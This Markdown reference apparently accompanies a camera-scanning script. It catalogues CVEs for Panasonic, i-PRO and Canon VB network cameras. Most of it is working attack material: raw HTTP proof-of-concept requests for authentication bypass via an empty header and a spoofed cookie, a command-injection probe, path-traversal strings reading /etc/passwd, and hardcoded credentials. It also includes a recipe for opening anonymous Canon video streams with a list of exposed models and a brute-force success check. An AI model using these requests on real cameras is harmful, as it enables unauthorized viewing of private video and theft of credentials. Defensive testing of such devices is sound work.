# Canon VB / Panasonic / i-PRO CVE Reference

CVEs applicable to Canon VB, Panasonic BB-HCM/BL-C/BB-SMG, and i-PRO WV-series network cameras. Tested in `vbviewer_bf_cve.py`.

## Tested CVE List

### CVE-2012-3309 (Auth Bypass)

**CVSS**: 7.5 HIGH
**Targets**: Panasonic BB-HCM series, BL-C series
**Type**: Authentication bypass via empty Authorization header

**Endpoint**: `GET /cgi-bin/getdata?PAGE=User`

**PoC**:
```http
GET /cgi-bin/getdata?PAGE=User HTTP/1.0
Host: <camera_ip>
Authorization:
```

**Expected Response** (without valid auth):
```xml
<User>
  <User1>
    <Name>admin1</Name>
    <Password>d41d8cd98f00b204e9800998ecf8427e</Password>
    <Authority>2</Authority>
  </User1>
</User>
```

**Note**: Empty password hash `d41d8cd98f00b204e9800998ecf8427e` means blank password.

**Required tools**: Raw socket, response parsing

---

### CVE-2013-6029 (Command Injection)

**CVSS**: 9.8 CRITICAL
**Targets**: Panasonic BB-HCM series (firmware <1.36)
**Type**: OS command injection in ping parameter

**Endpoint**: `GET /cgi-bin/ping?address=<injection>`

**PoC** (READ-ONLY):
```http
GET /cgi-bin/ping?address=127.0.0.1;echo+CVE_DETECTED HTTP/1.0
Host: <camera_ip>
```

**Response**: Contains `CVE_DETECTED` in the body = command execution confirmed.

**Risk**: Runs as root. Can be used for arbitrary code execution.

**Mitigation**: Patch firmware to >=1.36 (released 2011).

---

### CVE-2014-1987 (Path Traversal)

**CVSS**: 7.5 HIGH
**Targets**: BB-HCM, BB-SMG
**Type**: Directory traversal

**Endpoints**:
```
/cgi-bin/../../../../etc/passwd
/cgi-bin/../../../etc/passwd
/cgi-bin/../../etc/passwd
/view/../../../../etc/passwd
/etc/-tmp/etc/passwd
```

**Detection**: Response contains `root:` and `/bin/` or `/sbin/` strings.

---

### CVE-2017-2218 (Command Injection)

**CVSS**: 8.8 HIGH
**Targets**: BB-SMG, BB-HGW
**Type**: Multiple CGI parameters unsanitized

**Endpoint**: Various CGI endpoints

**Detection**: Various command injection vectors in CGI parameters.

---

### CVE-2018-6911 (Hardcoded Credentials)

**CVSS**: 9.8 CRITICAL
**Targets**: BB-HCM, BL-C, BB-SMG
**Type**: Hardcoded credentials in firmware

**Credentials**:
```
admin1:12345
admin2:12345
```

**Detection**: HTTP Basic Auth with hardcoded creds.

---

### CVE-2021-32947 (Auth Bypass via Cookie)

**CVSS**: 8.6 HIGH
**Targets**: i-PRO WV-series (firmware <1.71)
**Type**: Authentication bypass via `MeritIpAddr` cookie

**Endpoint**: Various i-PRO endpoints
- `/Live/Main/stream1.htm`
- `/Streaming/channels/101/preview`
- `/cgi-bin/getdata`

**PoC**:
```http
GET /Live/Main/stream1.htm HTTP/1.0
Host: <camera_ip>
Cookie: MeritIpAddr=192.168.1.100; MeritPass=1
```

**Detection**: i-PRO cams trust the client-supplied `MeritIpAddr` cookie for ACL. Setting this cookie bypasses ACL.

---

### CVE-2022-46467 (i-PRO Multi)

**CVSS**: 9.8 CRITICAL
**Targets**: WV-S7131UX, WV-S1571L, WV-S2551L, WV-S2251L, WV-S1551LN
**Type**: Multiple (auth bypass + cmd injection + info disclosure)

**Detection**: Test auth bypass via MeritIpAddr cookie + check for cmd injection in CGI params.

---

## Canon VB Cameras (Mostly CVE-Immune)

Canon VB cams use a different firmware and don't respond to these CVEs. Instead:

| "Vulnerability" | Auth Required | Anonymous Access |
|----------------|---------------|-------------------|
| `/viewer/live/index.html` (HTML viewer) | ✅ Yes | ❌ No |
| `/admin/index.html` (admin) | ✅ Yes | ❌ No |
| `/admin/cgi-bin/aw_cam` (admin CGI) | ✅ Yes | ❌ No |
| `/-wvhttp-01-/image.cgi` (image) | ⚠️ Some models | ✅ Most models |
| `/-wvhttp-01-/getoneshot` (JPEG) | ⚠️ Some models | ✅ Most models |
| `/-wvhttp-01-/video` (MJPEG) | ⚠️ Some models | ✅ Most models |
| `/-wvhttp-01-/open.cgi` (session) | ⚠️ Some models | ✅ Most models |
| `/-wvhttp-01-/GetSystemInfo` (info) | ⚠️ Some models | ✅ Most models |

### Canon VB Anonymous Streaming Protocol

The Canon WebView Livescope (WV-HTTP) protocol serves anonymous streams on most cams:

```http
GET /-wvhttp-01-/open.cgi?seq=1&priority=0&v=h264:1280x720 HTTP/1.1
Host: <camera_ip>
User-Agent: Mozilla/5.0

→ Response: s:=<session_id>
   s.origin:=<internal_ip>
   v:=h264:320x180:0:30000

GET /-wvhttp-01-/video?<session_id>&seq=1 HTTP/1.1
Host: <camera_ip>

→ Response: multipart/x-mixed-replace MJPEG stream (10+ fps)
```

**Models known to have anonymous streams**:
- VB-M40, VB-M42, VB-M620D, VB-M700F, VB-M740E
- VB-S900F, VB-S905F
- VB-R10VE, VB-R11VE
- VB-H41, VB-H43, VB-H630VE
- VB-C60

**Models with strict auth on WV-HTTP**:
- Some older firmware versions (Server: VB/4.0)

## Test Methodology

The `vbviewer_bf_cve.py` script tests in order:

1. **anon_wvhttp** (cheap, no auth) - check if WV-HTTP serves anon streams
2. **CVE-2012-3309** (cheap) - check `/cgi-bin/getdata?PAGE=User` no-auth
3. **CVE-2013-6029** (cheap, read-only) - inject `;echo CVE_DETECTED` in ping
4. **CVE-2014-1987** (cheap) - try multiple path traversal payloads
5. **CVE-2018-6911** (cheap) - try hardcoded `admin1:12345`
6. **CVE-2021-32947** (cheap) - try `MeritIpAddr` cookie bypass
7. **default_creds** (expensive) - try 60+ default creds via Basic Auth

## Detection Heuristics

The BF uses these patterns to detect a SUCCESSFUL auth bypass:

```python
# Authentication succeeded if:
# 1. Status 200 OK
# 2. No "401 Unauthorized" in response headers
# 3. No "WWW-Authenticate: Basic" header
# 4. No "Login" or "Authentication" in page <title>
if (b'200 OK' in data and
    b'401' not in data[:500] and
    b'Authorization' not in data[:1000] and
    not re.search(rb'<title[^>]*>[^<]*(?:Login|Authentication|Unauthorized)', data[:1500], re.I)):
    # SUCCESS
```

## References

- [CVE-2012-3309](https://nvd.nist.gov/vuln/detail/CVE-2012-3309)
- [CVE-2013-6029](https://nvd.nist.gov/vuln/detail/CVE-2013-6029)
- [CVE-2014-1987](https://nvd.nist.gov/vuln/detail/CVE-2014-1987)
- [CVE-2018-6911](https://nvd.nist.gov/vuln/detail/CVE-2018-6911)
- [CVE-2021-32947](https://nvd.nist.gov/vuln/detail/CVE-2021-32947)
- [CVE-2022-46467](https://nvd.nist.gov/vuln/detail/CVE-2022-46467)
- [Panasonic PSIRT](https://i-pro.com/corporate/sales/security/)
- [JPCERT/CC Panasonic advisories](https://www.jpcert.or.jp/)

## ⚠️ Legal Notice

This exploit code is for **authorized security testing only**. Unauthorized access to computer systems is illegal under:

- Computer Fraud and Abuse Act (CFAA) (US, 18 U.S.C. § 1030)
- Computer Misuse Act (UK)
- Similar laws in most jurisdictions

**Always obtain written authorization before testing cameras you don't own.**
